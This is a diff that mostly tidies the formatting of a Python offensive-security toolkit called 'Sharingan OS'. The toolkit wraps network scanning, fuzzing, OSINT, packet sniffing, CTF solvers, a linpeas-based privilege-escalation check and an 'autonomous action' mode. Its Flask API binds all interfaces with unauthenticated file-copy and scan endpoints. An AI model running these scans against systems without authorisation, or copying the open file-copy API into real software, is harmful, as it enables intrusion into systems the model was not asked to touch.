         result = subprocess.run(cmd, capture_output=True, text=True)
         return result.stdout
-    
+
     def extract_audio(self, video_file: str, output: str = "/tmp/audio.mp3") -> str:
         """Extract audio from video"""
         cmd = ["ffmpeg", "-i", video_file, "-vn", "-acodec", "libmp3lame", output, "-y"]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output if result.returncode == 0 else f"Failed: {result.stderr}"
-    
+
     def convert_media(self, input_file: str, output_file: str, format: str = "mp4") -> str:
         """Convert media format"""
         cmd = ["ffmpeg", "-i", input_file, output_file, "-y"]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output_file if result.returncode == 0 else f"Failed: {result.stderr}"
-    
-    def video_thumbnail(self, video_file: str, timestamp: str = "00:00:01", 
-                       output: str = "/tmp/thumb.jpg") -> str:
+
+    def video_thumbnail(self, video_file: str, timestamp: str = "00:00:01",
+                        output: str = "/tmp/thumb.jpg") -> str:
         """Extract video thumbnail"""
         cmd = ["ffmpeg", "-ss", timestamp, "-i", video_file, "-vframes", "1", output, "-y"]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output if result.returncode == 0 else f"Failed: {result.stderr}"
-    
+
     def record_audio(self, duration: int = 5, output: str = "/tmp/recording.wav") -> str:
         """Record audio from microphone"""
         cmd = ["arecord", "-d", str(duration), "-f", "cd", "-w", output]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return output if result.returncode == 0 else f"Failed: {result.stderr}"
-    
+
     # =========================================================================
     # DOCUMENT GENERATION
     # =========================================================================
-    
+
     def create_excel(self, data: List[Dict], output: str = "/tmp/report.xlsx") -> str:
         """Create Excel file"""
         try:
             from openpyxl import Workbook
             wb = Workbook()
             ws = wb.active
-            
+
             if not data:
                 wb.save(output)
                 return output
-            
+
             headers = list(data[0].keys())
             for col, header in enumerate(headers, 1):
                 ws.cell(row=1, column=col, value=header)
-            
+
             for row_num, row_data in enumerate(data, 2):
                 for col, header in enumerate(headers, 1):
                     ws.cell(row=row_num, column=col, value=str(row_data.get(header, "")))
-            
+
             wb.save(output)
             return output
         except ImportError:
             return "openpyxl not installed"
-    
+
     def create_word(self, title: str, content: str, output: str = "/tmp/report.docx") -> str:
         """Create Word document"""
         try:
@@ -1104,31 +1120,31 @@ Réponse:"""
             return output
         except ImportError:
             return "python-docx not installed"
-    
+
     def generate_report(self, title: str, data: Dict, output_format: str = "both") -> Dict:
         """Generate comprehensive report"""
         results = {}
-        
+
         if output_format in ["excel", "both"]:
             excel_data = [{"metric": k, "value": str(v)} for k, v in data.items()]
             results["excel"] = self.create_excel(excel_data)
-        
+
         if output_format in ["word", "both"]:
             content = "\n".join([f"{k}: {v}" for k, v in data.items()])
             results["word"] = self.create_word(title, content)
-        
+
         return results
-    
+
     # =========================================================================
     # API SERVER
     # =========================================================================
-    
+
     def create_api_app(self):
         """Create Flask API application"""
         from flask import Flask, jsonify, request
-        
+
         app = Flask(__name__)
-        
+
         @app.route('/')
         def index():
             return jsonify({
@@ -1136,26 +1152,26 @@ Réponse:"""
                 "version": VERSION,
                 "status": "operational"
             })
-        
+
         @app.route('/api/v1/health')
         def health():
             return jsonify({
                 "status": "healthy",
                 "timestamp": datetime.now().isoformat()
             })
-        
+
         @app.route('/api/v1/system/analyze', methods=['POST'])
         def system_analyze():
             metrics = self.monitor_system(interval=1, count=1)[0]
             return jsonify(metrics)
-        
+
         @app.route('/api/v1/ai/chat', methods=['POST'])
         def ai_chat():
             data = request.json
             message = data.get('message', '')
             response = self.ai_chat(message)
             return jsonify({"response": response})
-        
+
         @app.route('/api/v1/files/copy', methods=['POST'])
         def files_copy():
             data = request.json
@@ -1167,7 +1183,7 @@ Réponse:"""
                 return jsonify({"success": False, "error": "Missing src or dst"})
             success = self.copy_file(src, dst)
             return jsonify({"success": success})
-        
+
         @app.route('/api/v1/n8n/scan', methods=['POST'])
         def n8n_scan():
             data = request.json
@@ -1176,12 +1192,12 @@ Réponse:"""
             target = data.get('target', 'localhost')
             result = self.nmap_scan(target)
             return jsonify({"result": result})
-        
+
         return app
-    
-    def ffuf_scan(self, url: str, wordlist: str, param: str = "FUZZ", method: str = "GET",
-                   data: Optional[str] = None, headers: Optional[Dict] = None,
-                   threads: int = 40) -> List[Dict]:
+
+    def ffuf_scan(self, url: str, wordlist: str, param: str = "FUZZ",
+                  method: str = "GET", data: Optional[str] = None,
+                  headers: Optional[Dict] = None, threads: int = 40) -> List[Dict]:
         """Fuzzing with FFUF"""
         cmd = ["ffuf", "-u", url.replace("FUZZ", param), "-w", wordlist, "-t", str(threads)]
         if method != "GET" and data:
@@ -1297,7 +1313,7 @@ Réponse:"""
             if line.strip():
                 try:
                     findings.append(json.loads(line))
-                except:
+                except Exception:
                     pass
         return findings
 
@@ -1398,12 +1414,12 @@ Réponse:"""
                       min_word_length: int = 3) -> int:
         """Generate wordlist from website with Cewl"""
         cmd = ["cewl", "-d", str(depth), "-m", str(min_word_length), "-w", output, url]
-        result = subprocess.run(cmd, capture_output=True, text=True)
+        subprocess.run(cmd, capture_output=True, text=True)
 
         try:
             with open(output, 'r') as f:
                 return len(f.readlines())
-        except:
+        except Exception:
             return 0
 
     # =========================================================================
@@ -1486,7 +1502,7 @@ Réponse:"""
         if file_types:
             cmd.extend(["-t", ",".join(file_types)])
 
-        result = subprocess.run(cmd, capture_output=True, text=True)
+        subprocess.run(cmd, capture_output=True, text=True)
         recovered = []
         try:
             for f in os.listdir(output_dir):
@@ -1553,7 +1569,8 @@ Réponse:"""
 
             return {
                 "output": output,
-                "findings": len([l for l in run_result.stdout.split('\n') if 'You can duplicate' in l or 'root' in l])
+                "findings": len([line for line in run_result.stdout.split('\n')
+                                if 'You can duplicate' in line or 'root' in line])
             }
         return {"error": "Failed to download linpeas"}
 
@@ -1564,7 +1581,7 @@ Réponse:"""
             try:
                 with open('/proc/version', 'r') as f:
                     kernel = f.read().strip()
-            except:
+            except Exception:
                 return [{"error": "Could not determine kernel version"}]
 
         exploits = []
@@ -1652,12 +1669,12 @@ Réponse:"""
                 packets.append({"packet": line.strip()})
         return packets
 
-    def scapy_sniff(self, interface: str = "eth0", filter: str = "tcp",
+    def scapy_sniff(self, interface: str = "eth0", filter_str: str = "tcp",
                     count: int = 100, prn: Optional[Callable] = None) -> List[Any]:
         """Sniffing with Scapy"""
         try:
             from scapy.all import sniff
-            packets = sniff(iface=interface, filter=filter, count=count)
+            packets = sniff(iface=interface, filter=filter_str, count=count)
             return [p.summary() for p in packets]
         except ImportError:
             return [{"error": "scapy not installed"}]
@@ -1667,11 +1684,11 @@ Réponse:"""
     # =========================================================================
     # MAIN ENTRY POINT
     # =========================================================================
-    
+
     def run(self, args: Optional[List[str]] = None):
         """Main entry point with argparse"""
         import argparse
-        
+
         parser = argparse.ArgumentParser(
             description="Sharingan OS - Ethical Hacker & Full Stack Developer Toolkit",
             formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -1685,48 +1702,48 @@ EXAMPLES:
     %(prog)s api --host 0.0.0.0 --port 5000
             """
         )
-        
+
         parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
-        
+
         subparsers = parser.add_subparsers(dest='command', title='commands', metavar='COMMAND')
-        
+
         subparsers.add_parser('ai', help='Chat with AI').add_argument('message', nargs='*', help='Message to send')
-        
+
         monitor_parser = subparsers.add_parser('monitor', help='Monitor system metrics')
         monitor_parser.add_argument('--interval', '-i', type=int, default=5, help='Interval between checks')
         monitor_parser.add_argument('--count', '-c', type=int, default=10, help='Number of checks')
-        
+
         subparsers.add_parser('status', help='Show system status')
-        
+
         scan_parser = subparsers.add_parser('scan', help='Network scanning')
         scan_parser.add_argument('target', help='Target IP or hostname')
         scan_parser.add_argument('--ports', '-p', default='-p-', help='Port range')
         scan_parser.add_argument('--type', '-t', choices=['nmap', 'masscan', 'arp'], default='nmap', help='Scan type')
-        
+
         akatsuki_parser = subparsers.add_parser('akatsuki', help='Akatsuki AI agents')
         akatsuki_sub = akatsuki_parser.add_subparsers(dest='akatsuki_cmd', title='akatsuki commands')
-        
-        akatsuki_status = akatsuki_sub.add_parser('status', help='Show agent status')
+
+        akatsuki_sub.add_parser('status', help='Show agent status')
         akatsuki_sub.add_parser('list', help='List available agents')
-        
+
         deploy_parser = akatsuki_sub.add_parser('deploy', help='Deploy an agent')
         deploy_parser.add_argument('agent', help='Agent name (Itachi, Kisame, etc.)')
         deploy_parser.add_argument('task', help='Task to perform')
         deploy_parser.add_argument('--target', help='Target for the task')
-        
+
         ctf_parser = subparsers.add_parser('ctf', help='CTF utilities')
         ctf_sub = ctf_parser.add_subparsers(dest='ctf_cmd', title='ctf commands')
-        
+
         bandit_parser = ctf_sub.add_parser('bandit', help='OverTheWire Bandit solver')
         bandit_parser.add_argument('--levels', '-l', type=int, default=5, help='Number of levels')
-        
+
         natas_parser = ctf_sub.add_parser('natas', help='Natas solver')
         natas_parser.add_argument('level', type=int, help='Natas level')
-        
+
         htb_parser = ctf_sub.add_parser('htb', help='HackTheBox helpers')
         htb_parser.add_argument('--decode', choices=['base64', 'hex', 'rot13', 'url'], help='Decode method')
         htb_parser.add_argument('data', help='Data to decode')
-        
+
         subparsers.add_parser('privesc', help='Check privilege escalation vectors')
 
         netsentinel_parser = subparsers.add_parser('netsentinel', help='Network intrusion detection')
@@ -1743,77 +1760,77 @@ EXAMPLES:
         analyze_parser.add_argument('situation', help='Situation to analyze')
         autonomous_parser = consciousness_sub.add_parser('autonomous', help='Trigger autonomous action')
         autonomous_parser.add_argument('trigger', help='Trigger event')
-        
+
         # COMMANDE DO - Exécution directe d'actions
         do_parser = subparsers.add_parser('do', help='Execute action directly')
         do_sub = do_parser.add_subparsers(dest='do_cmd', title='do commands')
-        
+
         # do scan <target>
         scan_parser = do_sub.add_parser('scan', help='Execute network scan')
         scan_parser.add_argument('target', help='Target IP or range (e.g., 192.168.1.1 or 192.168.1.0/24)')
         scan_parser.add_argument('--type', '-t', choices=['quick', 'full', 'ports'], default='quick', help='Scan type')
-        
+
         # do gobuster <url>
         gobuster_parser = do_sub.add_parser('gobuster', help='Execute gobuster scan')
         gobuster_parser.add_argument('url', help='Target URL')
         gobuster_parser.add_argument('--wordlist', '-w', default='/usr/share/wordlists/dirb/common.txt')
-        
+
         # do lynis (audit système)
         do_sub.add_parser('lynis', help='Run system audit')
-        
+
         api_parser = subparsers.add_parser('api', help='Start API server')
         api_parser.add_argument('--host', default='0.0.0.0', help='Host to bind')
         api_parser.add_argument('--port', '-p', type=int, default=5000, help='Port to listen')
-        
+
         subparsers.add_parser('obligations', help='Check compliance obligations')
-        
+
         web_parser = subparsers.add_parser('web', help='Web utilities')
         web_sub = web_parser.add_subparsers(dest='web_cmd', title='web commands')
-        
+
         gobuster_parser = web_sub.add_parser('dir', help='Directory enumeration')
         gobuster_parser.add_argument('url', help='Target URL')
         gobuster_parser.add_argument('--wordlist', '-w', default='/usr/share/wordlists/dirb/common.txt')
-        
+
         whatweb_parser = web_sub.add_parser('tech', help='Identify technologies')
         whatweb_parser.add_argument('url', help='Target URL')
-        
+
         osint_parser = subparsers.add_parser('osint', help='OSINT utilities')
         osint_sub = osint_parser.add_subparsers(dest='osint_cmd', title='osint commands')
-        
+
         crtsh_parser = osint_sub.add_parser('subdomains', help='Find subdomains via crt.sh')
         crtsh_parser.add_argument('domain', help='Domain to search')
-        
+
         harvester_parser = osint_sub.add_parser('harvest', help='Harvest emails and hosts')
         harvester_parser.add_argument('domain', help='Domain to search')
-        
+
         docker_parser = subparsers.add_parser('docker', help='Docker utilities')
         docker_sub = docker_parser.add_subparsers(dest='docker_cmd', title='docker commands')
         docker_sub.add_parser('ps', help='List containers')
         docker_sub.add_parser('images', help='List images')
-        
+
         if not args:
             args = sys.argv[1:]
-        
+
         parsed = parser.parse_args(args if args else ['--help'])
-        
+
         if parsed.command is None:
             parser.print_help()
             return
-        
+
         try:
             if parsed.command == 'ai':
                 message = ' '.join(parsed.message) if parsed.message else "Hello"
                 print(self.sharingan_chat(message))
-            
+
             elif parsed.command == 'monitor':
                 metrics = self.monitor_system(parsed.interval, parsed.count)
                 print(json.dumps(metrics, indent=2))
-            
+
             elif parsed.command == 'status':
                 print(f"CPU: {self.get_cpu_usage()}%")
                 print(f"Memory: {self.get_memory_usage()}")
                 print(f"Disk: {self.get_disk_usage()}")
-            
+
             elif parsed.command == 'scan':
                 if parsed.type == 'nmap':
                     print(self.nmap_scan(parsed.target, parsed.ports))
@@ -1821,7 +1838,7 @@ EXAMPLES:
                     print(self.masscan_scan(parsed.target))
                 elif parsed.type == 'arp':
                     print(json.dumps(self.arp_scan(target=parsed.target), indent=2))
-            
+
             elif parsed.command == 'akatsuki':
                 if parsed.akatsuki_cmd == 'status':
                     print(json.dumps(self.akatsuki_status(), indent=2))
@@ -1831,7 +1848,7 @@ EXAMPLES:
                         print(f"  - {a}")
                 elif parsed.akatsuki_cmd == 'deploy':
                     print(json.dumps(self.akatsuki_deploy(parsed.agent, parsed.task, parsed.target), indent=2))
-            
+
             elif parsed.command == 'ctf':
                 if parsed.ctf_cmd == 'bandit':
                     print(json.dumps(self.bandit_solver(levels=parsed.levels), indent=2))
@@ -1841,29 +1858,30 @@ EXAMPLES:
                     if parsed.decode:
                         result = self.hackthebox_solve(parsed.decode, parsed.data)
                         print(json.dumps(result, indent=2))
-            
+
             elif parsed.command == 'privesc':
                 print(json.dumps(self.check_privilege_escalation(), indent=2))
-            
+
             elif parsed.command == 'netsentinel':
                 import sys as _sys_netsentinel
                 _sys_netsentinel.path.insert(0, str(Path(__file__).parent / "tools"))
                 from network_monitor import NetSentinel, ai_alert_handler
                 print("NetSentinel - Comprehensive System Monitoring & Intrusion Detection")
                 print("=" * 60)
-                
+
                 if parsed.daemon:
                     sentinel = NetSentinel(alert_callback=ai_alert_handler)
                     sentinel.start_background_monitor(parsed.interval)
                     print(f"Running in daemon mode (interval: {parsed.interval}s)")
                     print("Press Ctrl+C to stop")
                     try:
-                        while True: time.sleep(1)
+                        while True:
+                            time.sleep(1)
                     except KeyboardInterrupt:
                         sentinel.stop()
                         print("\nNetSentinel stopped.")
                 else:
-                    import readline
+                    import readline  # noqa: F401
                     sentinel = NetSentinel(alert_callback=ai_alert_handler)
                     print("\nInteractive mode. Commands: status, threats, watch, processes, ports, network, quit")
                     while True:
@@ -1900,7 +1918,7 @@ EXAMPLES:
                                     print("\nStopped watching.")
                             elif cmd == 'processes':
                                 procs = sentinel.get_process_info()
-                                print(f"\nTop 10 Processes:")
+                                print("\nTop 10 Processes:")
                                 for p in procs[:10]:
                                     print(f"  {p['pid']:6} | {p['cpu_percent']:5.1f}% | {p['memory_percent']:5.1f}% | {p['name']}")
                             elif cmd == 'ports':
@@ -1919,13 +1937,13 @@ EXAMPLES:
                             print("\nUse 'quit' to exit.")
                         except Exception as e:
                             print(f"Error: {e}")
-            
+
             elif parsed.command == 'consciousness':
                 import sys as _sys_consciousness
                 _sys_consciousness.path.insert(0, str(Path(__file__).parent))
                 from system_consciousness import SystemConsciousness
                 consciousness = SystemConsciousness()
-                
+
                 if parsed.consciousness_cmd == 'status':
                     status = consciousness.get_full_status()
                     print(f"\n[{datetime.now().isoformat()}]")
@@ -1936,13 +1954,13 @@ EXAMPLES:
                     print(f"Channel: {status['interaction']['channel_type']}")
                     print(f"Memory connected: {status['memory_connected']}")
                     print(f"Tools available: {len(status['tools'])}")
-                    
+
                 elif parsed.consciousness_cmd == 'capabilities':
                     status = consciousness.get_full_status()
                     print("\nAvailable Tools:")
                     for name, caps in status['tools'].items():
                         print(f"  {name}: {caps}")
-                        
+
                 elif parsed.consciousness_cmd == 'reflect':
                     status = consciousness.get_full_status()
                     print(f"\n[{datetime.now().isoformat()}]")
@@ -1951,7 +1969,7 @@ EXAMPLES:
                     print(f"Channel: {status['interaction']['channel_type']}")
                     print(f"Memory connected: {status['memory_connected']}")
                     print(f"Last action: {status.get('last_action', 'Never')}")
-                    
+
                 elif parsed.consciousness_cmd == 'environment':
                     status = consciousness.get_full_status()
                     env = status['environment']
@@ -1960,11 +1978,11 @@ EXAMPLES:
                     print(f"Hostname: {env['system']['hostname']}")
                     print(f"User: {env['runtime'].get('user', 'unknown')} (root: {env['security']['is_root']})")
                     print(f"IP: {env['network']['local_ip']}")
-                    print(f"Python: {env['runtime']['python_version']}")
-                    print(f"Architecture: {env['system']['architecture']}")
-                    print(f"\nPermissions:")
+                    print("Python: {}".format(env['runtime']['python_version']))
+                    print("Architecture: {}".format(env['system']['architecture']))
+                    print("\nPermissions:")
                     print(f"  Root: {env['security']['is_root']}")
-                            
+
                 elif parsed.consciousness_cmd == 'analyze':
                     result = consciousness.analyze_context(parsed.situation)
                     print(f"\nSituation: {result['situation']}")
@@ -1984,57 +2002,57 @@ EXAMPLES:
                             print(f"  ✗ {tool}")
                     print(f"\nRecommendation: {result['recommendation']}")
                     print(f"Missing packages: {result['environment_info'].get('missing_packages', [])}")
-                        
+
                 elif parsed.consciousness_cmd == 'autonomous':
                     result = consciousness.autonomous_action(parsed.trigger)
-                    print(f"\n{'='*60}")
-                    print(f"AUTONOMOUS RESPONSE TRIGGERED")
-                    print(f"{'='*60}")
+                    print("\n" + "="*60)
+                    print("AUTONOMOUS RESPONSE TRIGGERED")
+                    print("="*60)
                     print(f"Trigger: {result.get('trigger', 'unknown')}")
                     print(f"Intent detected: {result.get('intent', 'unknown')}")
                     print(f"Consciousness level: {result.get('consciousness_level', 'UNKNOWN')}")
                     print(f"Environment aware: {result.get('environment_aware', False)}")
-                    print(f"\nAdaptations:")
+                    print("\nAdaptations:")
                     print(f"  Available: {result.get('adaptations', {}).get('available', [])}")
                     print(f"  Requested: {result.get('adaptations', {}).get('requested', 'unknown')}")
                     print(f"  Missing: {result.get('adaptations', {}).get('missing', [])}")
-                    print(f"\nTools activated:")
+                    print("\nTools activated:")
                     for tool in result.get('tools_used', []):
                         print(f"  [{tool.get('status', '?')}] {tool.get('tool', 'unknown')}: {tool.get('action', 'unknown')}")
                         print(f"    Command: {tool.get('command', 'N/A')}")
                     print(f"\nConfidence: {result.get('analysis', {}).get('confidence', 0.0):.2f}")
                     print(f"{'='*60}")
-            
+
             elif parsed.command == 'api':
                 app = self.create_api_app()
                 print(f"Starting Sharingan OS API on {parsed.host}:{parsed.port}")
                 app.run(host=parsed.host, port=parsed.port)
-            
+
             elif parsed.command == 'obligations':
                 print(json.dumps(self.check_obligations(), indent=2))
-            
+
             elif parsed.command == 'web':
                 if parsed.web_cmd == 'dir':
                     print(json.dumps(self.gobuster_scan(parsed.url, parsed.wordlist), indent=2))
                 elif parsed.web_cmd == 'tech':
                     print(json.dumps(self.whatweb_scan(parsed.url), indent=2))
-            
+
             elif parsed.command == 'osint':
                 if parsed.osint_cmd == 'subdomains':
                     print(json.dumps(self.crtsh_search(parsed.domain), indent=2))
                 elif parsed.osint_cmd == 'harvest':
                     print(json.dumps(self.theharvester_scan(parsed.domain), indent=2))
-            
+
             elif parsed.command == 'docker':
                 if parsed.docker_cmd == 'ps':
                     print(json.dumps(self.docker_ps(), indent=2))
                 elif parsed.docker_cmd == 'images':
                     print(json.dumps(self.docker_images(), indent=2))
-        
+
         except Exception as e:
             logger.error(f"Command failed: {e}")
             print(f"Error: {e}")
-    
+
     def show_help(self):
         """Show help message"""
         print(f"""
@@ -2060,6 +2078,8 @@ EXAMPLES:
 """)
 
 # Create singleton instance
+
+
 sharingan = SharinganOS()
 
 
